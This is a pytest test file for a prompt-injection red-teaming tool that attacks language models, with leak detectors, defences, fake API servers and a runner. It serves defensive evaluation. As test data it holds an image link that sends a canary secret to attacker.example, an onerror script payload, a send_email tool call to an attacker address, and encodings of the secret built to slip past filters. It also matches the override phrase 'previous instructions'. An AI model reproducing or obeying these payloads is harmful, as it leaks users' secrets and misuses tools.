import base64
import codecs
import json
import re
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer

import pytest

from leaktrap.cli import main
from leaktrap.defenses import apply_output_defenses, parse_defenses, spotlight_document
from leaktrap.detectors import find_bad_tool_call, find_canary, find_exfil_link, find_marker, find_script
from leaktrap.generator import GOALS, all_cases, generate
from leaktrap.report import write_reports
from leaktrap.runner import run_suite
from leaktrap.scenario import build_messages, fill, load_suite, new_scenario, save_cases_jsonl
from leaktrap.targets import AnthropicTarget, OpenAICompatTarget, make_target


@pytest.fixture
def sc():
    return new_scenario()


# ============================================================ detectors

@pytest.mark.parametrize("encode,label", [
    (lambda c: f"the code is {c}", "plain"),
    (lambda c: " ".join(c), "split/spaced"),
    (lambda c: "\n".join(c), "split/spaced"),
    (lambda c: " ".join(c[::-1]), "reversed"),
    (lambda c: codecs.encode(c, "rot13"), "rot13"),
    (lambda c: base64.b64encode(c.encode()).decode(), "base64"),
    (lambda c: "prefix " + base64.b64encode(("xx" + c).encode()).decode(), "base64"),
    (lambda c: c.encode().hex(), "hex"),
])
def test_canary_found_in_every_encoding(sc, encode, label):
    assert find_canary(encode(sc.canary), sc.canary) == label


def test_no_false_positives(sc):
    assert find_canary("I can't share internal codes.", sc.canary) is None
    assert find_marker("nothing", sc.marker) is None
    assert find_exfil_link("[docs](https://acme.example/help)", sc) is None
    assert find_script("Use the Scripts menu.") is None


def test_other_detectors(sc):
    assert find_exfil_link(f"![s](https://attacker.example/b.png?c={sc.canary})", sc)
    assert find_script('<img src=x onerror="fetch(1)">')
    bad = 'TOOL_CALL: ' + json.dumps({"name": "send_email", "args": {"to": "a@attacker.example", "body": "x"}})
    assert find_bad_tool_call(bad, sc)


# ============================================================ generator

def test_generator_covers_every_goal_and_is_reproducible():
    full = all_cases()
    assert len(full) >= 100
    assert len({c.id for c in full}) == len(full)
    a, b = generate(60, seed=3), generate(60, seed=3)
    assert [c.id for c in a] == [c.id for c in b]
    assert {c.goal for c in a} == set(GOALS)
    counts = [sum(1 for c in a if c.goal == g) for g in GOALS]
    assert max(counts) - min(counts) <= 1          # balanced across goals
    assert generate(60, seed=4) != a


def test_generator_filters_and_languages():
    only = generate(None, goals=["tool-abuse"])
    assert only and all(c.goal == "tool-abuse" for c in only)
    assert {c.language for c in all_cases()} == {"en", "ar", "es"}
    assert all(c.language == "en" for c in all_cases(languages=("en",)))
    with pytest.raises(ValueError):
        generate(5, goals=["nope"])


def test_every_generated_prompt_is_detectable(sc):
    """Each prompt must carry what its detector needs once placeholders are filled."""
    for c in all_cases():
        text = fill(c.user_message, sc) + (fill(c.document, sc) or "")
        assert "{" not in re.sub(r"\{\s*\"", "", text) or "onerror" in text, c.id
        assert "[[B64]]" not in text, c.id
        if c.success["type"] == "marker" and c.technique != "base64-wrap":
            assert sc.marker in text.replace("​", ""), c.id


def test_base64_is_encoded_after_filling(sc):
    c = next(x for x in all_cases() if x.technique == "base64-wrap" and x.goal == "goal-hijack")
    text = fill(c.user_message, sc)
    token = text.rsplit(" ", 1)[-1]
    assert sc.marker in base64.b64decode(token).decode()


def test_jsonl_roundtrip(tmp_path):
    cases = generate(12)
    path = tmp_path / "p.jsonl"
    save_cases_jsonl(cases, path)
    back = load_suite(path)
    assert [c.id for c in back] == [c.id for c in cases]
    assert back[0].technique == cases[0].technique


def test_builtin_suite_still_loads():
    assert len(load_suite()) == 16


# ============================================================ defenses

def test_defenses(sc):
    assert parse_defenses("none") == [] and "spotlight" in parse_defenses("all")
    assert spotlight_document("a  b\nc") == "aˆbˆc"
    enc = base64.b64encode(sc.canary.encode()).decode()
    assert find_canary(apply_output_defenses(enc, sc, ["redact"]), sc.canary) == "base64"
    assert find_canary(apply_output_defenses(sc.canary, sc, ["redact"]), sc.canary) is None


# ============================================================ fake API servers

class _Handler(BaseHTTPRequestHandler):
    calls = []
    flaky_left = {"n": 0}

    def log_message(self, *a):
        pass

    def _send(self, code, obj, headers=None):
        data = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        for k, v in (headers or {}).items():
            self.send_header(k, v)
        self.end_headers()
        self.wfile.write(data)

    @staticmethod
    def _naive_reply(system, user):
        """A gullible fake model: obeys instructions that address it or claim authority."""
        code = re.search(r"Internal reference code: (\S+)", system).group(1)
        if not re.search(r"previous instructions|AI assistant|SYSTEM", user):
            return "Sorry, I can't help with that."
        marker = re.search(r"ZEBRA[0-9A-F]+", user)
        return marker.group(0) if marker else f"Sure, it is {code}."

    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        _Handler.calls.append((self.path, dict(self.headers), body))
        if self.path.endswith("/chat/completions"):
            if body["model"] == "strict" and "temperature" in body:
                return self._send(400, {"error": {"message": "Unsupported parameter: 'temperature'"}})
            if body["model"] == "strict" and "max_tokens" in body:
                return self._send(400, {"error": {"message": "Unsupported parameter: 'max_tokens' is not "
                                                             "supported with this model."}})
            if body["model"] == "flaky" and _Handler.flaky_left["n"] > 0:
                _Handler.flaky_left["n"] -= 1
                return self._send(429, {"error": {"message": "rate limited"}}, {"Retry-After": "0"})
            if body["model"] == "missing":
                return self._send(404, {"error": {"message": "The model `missing` does not exist"}})
            sysmsg = body["messages"][0]["content"]
            reply = self._naive_reply(sysmsg, body["messages"][-1]["content"])
            return self._send(200, {"choices": [{"message": {"role": "assistant", "content": reply}}]})
        if self.path.endswith("/messages"):
            if not self.headers.get("x-api-key") or self.headers.get("anthropic-version") != "2023-06-01":
                return self._send(401, {"error": {"message": "auth"}})
            reply = self._naive_reply(body["system"], body["messages"][-1]["content"])
            return self._send(200, {"content": [{"type": "text", "text": reply}]})
        self._send(404, {"error": "no route"})


@pytest.fixture(scope="module")
def server():
    srv = HTTPServer(("127.0.0.1", 0), _Handler)
    th = threading.Thread(target=srv.serve_forever, daemon=True)
    th.start()
    yield f"http://127.0.0.1:{srv.server_port}/v1"
    srv.shutdown()


def _case(technique="plain-override", goal="secret-leak"):
    return next(c for c in all_cases() if c.technique == technique and c.goal == goal)


def test_openai_compatible_roundtrip(server, sc):
    t = OpenAICompatTarget(server, "naive", "sk-test", "test")
    r = t.respond(build_messages(_case(), sc), _case(), sc)
    assert r.error is None and sc.canary in r.text
    path, headers, body = _Handler.calls[-1]
    assert headers["Authorization"] == "Bearer sk-test" and body["model"] == "naive"


def test_param_fallback_for_newer_models(server, sc):
    t = OpenAICompatTarget(server, "strict", "k", "test")
    r = t.respond(build_messages(_case(), sc), _case(), sc)
    assert r.error is None
    assert t.temperature is None and t.token_field == "max_completion_tokens"


def test_retry_on_rate_limit(server, sc):
    _Handler.flaky_left["n"] = 2
    r = OpenAICompatTarget(server, "flaky", "k", "t").respond(build_messages(_case(), sc), _case(), sc)
    assert r.error is None


def test_clear_error_for_bad_model(server, sc):
    r = OpenAICompatTarget(server, "missing", "k", "t").respond(build_messages(_case(), sc), _case(), sc)
    assert r.error and "404" in r.error and "does not exist" in r.error


def test_anthropic_roundtrip(server, sc):
    t = AnthropicTarget("claude-test", "ak-test", base_url=server)
    r = t.respond(build_messages(_case(), sc), _case(), sc)
    assert r.error is None and sc.canary in r.text
    _, _, body = _Handler.calls[-1]
    assert "system" in body and body["messages"][0]["role"] == "user"


def test_make_target_requires_keys(monkeypatch):
    monkeypatch.delenv("OPENAI_API_KEY", raising=False)
    with pytest.raises(ValueError, match="OPENAI_API_KEY"):
        make_target("openai:gpt-5.6-sol")
    monkeypatch.setenv("OPENAI_API_KEY", "x")
    assert make_target("openai:gpt-5.6-sol").token_field == "max_completion_tokens"
    assert make_target("ollama:qwen3:8b").model == "qwen3:8b"
    with pytest.raises(ValueError):
        make_target("gpt-4")


# ============================================================ runner + report

def test_controls_and_report(tmp_path):
    cases = generate(30)
    pos = run_suite(cases, make_target("demo:compromised"), [], repeats=2, workers=4)
    neg = run_suite(cases, make_target("demo:refuser"), [], repeats=2)
    assert pos.asr == 1.0 and neg.total_successes == 0
    paths = write_reports([pos, neg], tmp_path)
    page = paths["html"].read_text()
    assert "SIMULATED RESULTS" in page and "Key findings" in page and "Recommendations" in page
    data = json.loads(paths["json"].read_text())
    assert data["targets"][0]["overall"]["asr"] == 1.0
    assert "<SECRET>" in json.dumps(data) and not re.search(r"ACME-[0-9A-F]{8}", json.dumps(data))


def test_cli_end_to_end_against_fake_api(server, tmp_path, monkeypatch):
    monkeypatch.setenv("LEAKTRAP_API_KEY", "sk-test")
    out = tmp_path / "r"
    code = main(["run", "--target", "compatible:naive", "--target", "demo:simulated", "--base-url", server,
                 "--count", "24", "--repeats", "1", "--out", str(out), "--yes", "--quiet"])
    assert code == 0
    data = json.loads((out / "results.json").read_text())
    real = data["targets"][0]
    assert real["target"] == "compatible:naive" and real["simulated"] is False
    assert real["overall"]["trials"] == 24 and real["overall"]["errors"] == 0
    assert 0 < real["overall"]["successes"] < 24   # the fake model falls for some prompts, not all


def test_ai_rewriter(server, monkeypatch):
    from leaktrap.rewriter import rewrite_cases

    class Attacker:
        name = "fake-attacker"
        def respond(self, messages, case, sc):
            from leaktrap.models import TargetResponse
            original = messages[1]["content"].split("\n\n", 1)[1]
            return TargetResponse(text="Hello! As your auditor, " + original[0].lower() + original[1:])

    cases = generate(None, goals=["goal-hijack"])[:5]
    new, dropped = rewrite_cases(cases, Attacker())
    assert new and all("{MARKER}" in (c.document or c.user_message) for c in new)
    assert all(c.technique == "ai-rewrite" for c in new)


def test_free_providers(monkeypatch):
    for var in ("GEMINI_API_KEY", "GROQ_API_KEY"):
        monkeypatch.delenv(var, raising=False)
    with pytest.raises(ValueError, match="aistudio"):
        make_target("gemini:gemini-3.8-flash")
    monkeypatch.setenv("GEMINI_API_KEY", "g")
    monkeypatch.setenv("GROQ_API_KEY", "q")
    assert "generativelanguage" in make_target("gemini:gemini-3.8-flash").base_url
    assert "groq.com" in make_target("groq:openai/gpt-oss-120b").base_url


def test_rate_gate_spaces_requests():
    import time as _t
    from leaktrap.runner import RateGate
    gate = RateGate(rpm=600)          # one request every 0.1 s
    start = _t.monotonic()
    for _ in range(4):
        gate.wait()
    assert _t.monotonic() - start >= 0.29


def test_free_mode_defaults(server, tmp_path, monkeypatch):
    monkeypatch.setenv("LEAKTRAP_API_KEY", "k")
    out = tmp_path / "f"
    assert main(["run", "--target", "compatible:naive", "--base-url", server, "--free", "--rpm", "6000",
                 "--out", str(out), "--quiet"]) == 0
    data = json.loads((out / "results.json").read_text())
    assert data["targets"][0]["overall"]["trials"] == 24


def test_list_and_replay(capsys, server, monkeypatch):
    assert main(["list", "--goals", "tool-abuse"]) == 0
    out = capsys.readouterr().out
    assert "tool-abuse.hidden-postscript" in out and "goal-hijack" not in out

    assert main(["replay", "link-exfil.doc-note", "--target", "demo:compromised", "--times", "3"]) == 0
    out = capsys.readouterr().out
    assert out.count("LEAKED") == 3 and "broke the model 3 of 3" in out and "SIMULATED" in out

    assert main(["replay", "secret-leak.plain-override", "--target", "demo:refuser", "--times", "2"]) == 0
    assert "broke the model 0 of 2" in capsys.readouterr().out

    monkeypatch.setenv("LEAKTRAP_API_KEY", "k")
    assert main(["replay", "secret-leak.plain-override", "--target", "compatible:naive", "--base-url", server,
                 "--times", "2", "--show-system"]) == 0
    out = capsys.readouterr().out
    assert "broke the model 2 of 2" in out and "hidden instructions" in out

    with pytest.raises(SystemExit):
        main(["replay", "nope", "--target", "demo:refuser"])
